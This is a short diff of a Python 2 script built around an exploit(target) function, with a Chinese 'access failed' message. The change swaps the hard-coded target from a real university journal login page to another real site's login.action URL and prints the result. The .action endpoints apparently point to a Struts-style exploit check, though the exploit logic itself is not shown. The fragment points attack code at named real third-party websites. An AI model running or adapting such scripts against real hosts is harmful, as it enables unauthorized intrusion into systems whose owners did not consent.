@@ -37,4 +37,5 @@ def exploit(target):
         print "访问失败"
         pass
 
-status,keyword = exploit("http://jms.fudan.edu.cn/journalx_jms/authorLogOn.action?mag_Id=1")
+status,keyword = exploit("http://www.vhomework.com/login.action?lasturl=/view/s/bk_info.vm")
+print keyword
